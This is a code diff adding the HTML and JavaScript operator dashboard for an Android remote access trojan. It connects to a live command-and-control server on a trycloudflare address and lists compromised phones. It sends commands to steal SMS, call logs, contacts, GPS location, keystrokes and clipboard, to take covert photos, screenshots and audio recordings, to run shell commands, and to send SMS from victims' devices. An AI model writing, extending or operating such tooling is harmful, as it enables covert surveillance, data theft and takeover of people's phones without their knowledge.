@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RAT Dashboard</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+        body { background: #0d1117; color: #c9d1d9; min-height: 100vh; }
+        .header { background: #161b22; border-bottom: 1px solid #30363d; padding: 1rem 2rem; display: flex; justify-content: space-between; align-items: center; }
+        .header h1 { color: #58a6ff; font-size: 1.5rem; }
+        .status { display: flex; gap: 1rem; align-items: center; }
+        .status-dot { width: 10px; height: 10px; border-radius: 50%; background: #f85149; }
+        .status-dot.connected { background: #3fb950; }
+        .container { display: flex; min-height: calc(100vh - 60px); }
+        .sidebar { width: 300px; background: #161b22; border-right: 1px solid #30363d; overflow-y: auto; }
+        .main { flex: 1; padding: 2rem; overflow-y: auto; }
+        .device-list { padding: 1rem; }
+        .device-item { background: #21262d; border: 1px solid #30363d; border-radius: 6px; padding: 1rem; margin-bottom: 0.5rem; cursor: pointer; transition: all 0.2s; }
+        .device-item:hover { background: #30363d; border-color: #58a6ff; }
+        .device-item.selected { border-color: #58a6ff; background: #1f3a5f; }
+        .device-name { font-weight: 600; color: #58a6ff; margin-bottom: 0.25rem; }
+        .device-info { font-size: 0.85rem; color: #8b949e; }
+        .device-status { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 0.5rem; }
+        .device-status.online { background: #3fb950; }
+        .device-status.offline { background: #f85149; }
+        .panel { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 1.5rem; margin-bottom: 1rem; }
+        .panel h2 { color: #58a6ff; margin-bottom: 1rem; font-size: 1.2rem; }
+        .btn { background: #238636; color: white; border: none; padding: 0.5rem 1rem; border-radius: 6px; cursor: pointer; margin-right: 0.5rem; margin-bottom: 0.5rem; }
+        .btn:hover { background: #2ea043; }
+        .btn.danger { background: #da3633; }
+        .btn.danger:hover { background: #f85149; }
+        .btn.secondary { background: #21262d; border: 1px solid #30363d; }
+        .btn.secondary:hover { background: #30363d; }
+        .input { background: #0d1117; border: 1px solid #30363d; color: #c9d1d9; padding: 0.5rem; border-radius: 6px; width: 100%; margin-bottom: 0.5rem; font-family: monospace; }
+        .log-entry { font-family: monospace; font-size: 0.85rem; padding: 0.5rem; background: #0d1117; margin-bottom: 0.25rem; border-radius: 4px; border-left: 3px solid #58a6ff; }
+        .log-entry.error { border-left-color: #f85149; }
+        .log-entry.success { border-left-color: #3fb950; }
+        .log-entry.warning { border-left-color: #d29922; }
+        .command-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 0.5rem; margin-bottom: 1rem; }
+        .command-btn { background: #21262d; border: 1px solid #30363d; color: #c9d1d9; padding: 0.75rem; border-radius: 6px; cursor: pointer; text-align: left; transition: all 0.2s; }
+        .command-btn:hover { background: #30363d; border-color: #58a6ff; }
+        .command-btn .cmd-name { font-weight: 600; color: #58a6ff; }
+        .command-btn .cmd-desc { font-size: 0.8rem; color: #8b949e; margin-top: 0.25rem; }
+        .response-panel { background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 1rem; max-height: 400px; overflow-y: auto; font-family: monospace; font-size: 0.85rem; white-space: pre-wrap; }
+        .empty-state { text-align: center; padding: 3rem; color: #8b949e; }
+        .empty-state svg { width: 64px; height: 64px; margin-bottom: 1rem; opacity: 0.5; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🕷️ RAT Dashboard</h1>
+        <div class="status">
+            <span class="status-dot" id="statusDot"></span>
+            <span id="statusText">Connecting...</span>
+        </div>
+    </div>
+    <div class="container">
+        <div class="sidebar">
+            <div class="device-list" id="deviceList">
+                <div class="empty-state">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                        <path d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path>
+                    </svg>
+                    <p>No devices connected</p>
+                    <p style="font-size: 0.85rem; margin-top: 0.5rem;">Waiting for connections...</p>
+                </div>
+            </div>
+        </div>
+        <div class="main">
+            <div id="noDeviceSelected" style="display: block;">
+                <div class="empty-state">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                        <path d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
+                    </svg>
+                    <h2 style="margin-bottom: 0.5rem;">Select a Device</h2>
+                    <p>Choose a device from the sidebar to view details and send commands</p>
+                </div>
+            </div>
+            <div id="devicePanel" style="display: none;">
+                <div class="panel">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
+                        <h2 id="selectedDeviceName">Device</h2>
+                        <span class="device-status online" id="deviceStatusDot"></span>
+                    </div>
+                    <div id="deviceInfo" style="color: #8b949e; font-size: 0.9rem;"></div>
+                </div>
+                <div class="panel">
+                    <h2>Quick Commands</h2>
+                    <div class="command-grid" id="commandGrid"></div>
+                </div>
+                <div class="panel">
+                    <div style="display: flex; gap: 0.5rem; margin-bottom: 1rem;">
+                        <input type="text" class="input" id="customCommand" placeholder="Custom command (e.g., shell ls -la)" style="flex: 1;">
+                        <button class="btn" onclick="sendCustomCommand()">Send</button>
+                    </div>
+                    <div style="display: flex; gap: 0.5rem; margin-bottom: 1rem;">
+                        <input type="text" class="input" id="smsNumber" placeholder="Phone number" style="width: 120px;">
+                        <input type="text" class="input" id="smsText" placeholder="Message" style="flex: 1;">
+                        <button class="btn" onclick="sendSms()">Send SMS</button>
+                    </div>
+                </div>
+                <div class="panel">
+                    <h2>Response</h2>
+                    <div class="response-panel" id="responsePanel">Select a device and send a command to see response here...</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <script>
+        const C2_URL = 'https://par-instructions-former-numbers.trycloudflare.com';
+        let socket;
+        let devices = {};
+        let selectedDeviceId = null;
+
+        function init() {
+            connectSocket();
+            fetchDevices();
+            setInterval(fetchDevices, 10000);
+        }
+
+        function connectSocket() {
+            socket = io(C2_URL, {
+                transports: ['websocket', 'polling'],
+                reconnection: true,
+                reconnectionAttempts: 10,
+                reconnectionDelay: 1000
+            });
+
+            socket.on('connect', () => {
+                updateStatus(true);
+                log('Connected to C2 server', 'success');
+                fetchDevices();
+            });
+
+            socket.on('disconnect', () => {
+                updateStatus(false);
+                log('Disconnected from C2 server', 'error');
+            });
+
+            socket.on('command_result', (data) => {
+                displayResponse(data);
+            });
+
+            socket.on('device_connected', (data) => {
+                log('Device connected: ' + data.model, 'success');
+                fetchDevices();
+            });
+
+            socket.on('device_disconnected', (data) => {
+                log('Device disconnected: ' + data.id, 'warning');
+                fetchDevices();
+            });
+
+            socket.on('error', (err) => {
+                log('Socket error: ' + err, 'error');
+            });
+        }
+
+        function updateStatus(connected) {
+            const dot = document.getElementById('statusDot');
+            const text = document.getElementById('statusText');
+            if (connected) {
+                dot.classList.add('connected');
+                text.textContent = 'Connected';
+            } else {
+                dot.classList.remove('connected');
+                text.textContent = 'Disconnected';
+            }
+        }
+
+        async function fetchDevices() {
+            try {
+                const res = await fetch('https://par-instructions-former-numbers.trycloudflare.com/clients');
+                const data = await res.json();
+                devices = {};
+                data.clients.forEach(d => devices[d.id] = d);
+                renderDeviceList();
+            } catch (e) {
+                log('Failed to fetch devices: ' + e, 'error');
+            }
+        }
+
+        function renderDeviceList() {
+            const list = document.getElementById('deviceList');
+            const ids = Object.keys(devices);
+            
+            if (ids.length === 0) {
+                list.innerHTML = `
+                    <div class="empty-state">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                            <path d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path>
+                        </svg>
+                        <p>No devices connected</p>
+                        <p style="font-size: 0.85rem; margin-top: 0.5rem;">Waiting for connections...</p>
+                    </div>
+                `;
+                return;
+            }
+
+            list.innerHTML = ids.map(id => {
+                const d = devices[id];
+                const isSelected = id === selectedDeviceId;
+                return `
+                    <div class="device-item ${isSelected ? 'selected' : ''}" onclick="selectDevice('${id}')">
+                        <div class="device-name">
+                            <span class="device-status ${d.online ? 'online' : 'offline'}"></span>
+                            ${d.model || 'Unknown'} (${d.manufacturer || ''})
+                        </div>
+                        <div class="device-info">
+                            Android ${d.android_version || '?'} \u2022 ${d.ip || 'Unknown IP'} \u2022 ${d.online ? 'Online' : 'Offline'}
+                        </div>
+                    </div>
+                `;
+            }).join('');
+        }
+
+        function selectDevice(id) {
+            selectedDeviceId = id;
+            const d = devices[id];
+            document.getElementById('noDeviceSelected').style.display = 'none';
+            document.getElementById('devicePanel').style.display = 'block';
+            document.getElementById('selectedDeviceName').textContent = d.model || 'Unknown';
+            document.getElementById('deviceStatusDot').className = 'device-status ' + (d.online ? 'online' : 'offline');
+            document.getElementById('deviceInfo').innerHTML = `
+                <strong>ID:</strong> ${id}<br>
+                <strong>Manufacturer:</strong> ${d.manufacturer || 'Unknown'}<br>
+                <strong>Model:</strong> ${d.model || 'Unknown'}<br>
+                <strong>Android:</strong> ${d.android_version || 'Unknown'}<br>
+                <strong>IP:</strong> ${d.ip || 'Unknown'}<br>
+                <strong>Status:</strong> ${d.online ? 'Online' : 'Offline'}
+            `;
+            renderCommands();
+            renderDeviceList();
+        }
+
+        function renderCommands() {
+            const commands = [
+                { name: 'Device Info', cmd: 'device_info', desc: 'Get full device information', args: {} },
+                { name: 'Get SMS', cmd: 'get_sms', desc: 'Retrieve SMS messages', args: { limit: 50 } },
+                { name: 'Call Logs', cmd: 'get_calls', desc: 'Retrieve call history', args: { limit: 50 } },
+                { name: 'Contacts', cmd: 'get_contacts', desc: 'Retrieve contacts', args: { limit: 100 } },
+                { name: 'Location', cmd: 'get_location', desc: 'Get GPS location', args: {} },
+                { name: 'Installed Apps', cmd: 'get_installed_apps', desc: 'List installed applications', args: { include_system: false } },
+                { name: 'Battery Info', cmd: 'battery_info', desc: 'Get battery status', args: {} },
+                { name: 'Network Info', cmd: 'network_info', desc: 'Get network information', args: {} },
+                { name: 'Installed Apps', cmd: 'get_installed_apps', desc: 'List installed applications', args: { include_system: false } },
+                { name: 'Shell (ls)', cmd: 'shell', desc: 'Execute shell command', args: { cmd: 'ls -la' } },
+                { name: 'Get Files', cmd: 'list_files', desc: 'List files in directory', args: { path: '/sdcard/', recursive: false } },
+                { name: 'Take Photo', cmd: 'take_photo', desc: 'Take a photo', args: { camera: 0, quality: 80 } },
+                { name: 'Screenshot', cmd: 'screenshot', desc: 'Capture screenshot', args: {} },
+                { name: 'Record Audio', cmd: 'record_audio', desc: 'Record microphone', args: { duration: 10000, format: 'amr' } },
+                { name: 'Keylogs', cmd: 'get_keylogs', desc: 'Get captured keystrokes', args: {} },
+                { name: 'Clipboard', cmd: 'get_clipboard', desc: 'Get clipboard content', args: {} },
+            ];
+
+            const grid = document.getElementById('commandGrid');
+            grid.innerHTML = commands.map(c => `
+                <button class="command-btn" onclick="sendCommand('${c.cmd}', ${JSON.stringify(c.args).replace(/"/g, '"')})">
+                    <div class="cmd-name">${c.name}</div>
+                    <div class="cmd-desc">${c.desc}</div>
+                </button>
+            `).join('');
+        }
+
+        function sendCommand(cmd, args) {
+            if (!selectedDeviceId) return;
+            log('Sending: ' + cmd, 'warning');
+            fetch('https://par-instructions-former-numbers.trycloudflare.com/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ clientId: selectedDeviceId, command: cmd, args })
+            })
+            .then(r => r.json())
+            .then(data => {
+                if (data.success) {
+                    log('Command queued: ' + cmd, 'success');
+                } else {
+                    log('Error: ' + data.error, 'error');
+                }
+            })
+            .catch(e => log('Error: ' + e, 'error'));
+        }
+
+        function sendCustomCommand() {
+            const input = document.getElementById('customCommand').value.trim();
+            if (!input || !selectedDeviceId) return;
+            const parts = input.split(' ');
+            const cmd = parts[0];
+            const args = {};
+            if (parts.length > 1) {
+                try { args.cmd = parts.slice(1).join(' '); } catch {}
+            }
+            sendCommand(cmd, args);
+            document.getElementById('customCommand').value = '';
+        }
+
+        function sendSms() {
+            const number = document.getElementById('smsNumber').value.trim();
+            const text = document.getElementById('smsText').value.trim();
+            if (!number || !text || !selectedDeviceId) return;
+            sendCommand('send_sms', { number, text });
+            document.getElementById('smsNumber').value = '';
+            document.getElementById('smsText').value = '';
+        }
+
+        function displayResponse(data) {
+            const panel = document.getElementById('responsePanel');
+            const time = new Date().toLocaleTimeString();
+            let content = '';
+            try {
+                content = typeof data === 'string' ? data : JSON.stringify(data, null, 2);
+            } catch { content = String(data); }
+            panel.innerHTML = '<span style="color: #8b949e;">[' + new Date().toLocaleTimeString() + ']</span>\n' + content;
+            panel.scrollTop = panel.scrollHeight;
+        }
+
+        function log(msg, type) {
+            console.log('[' + type + '] ' + msg);
+        }
+
+        init();
+    </script>
+</body>
+</html>
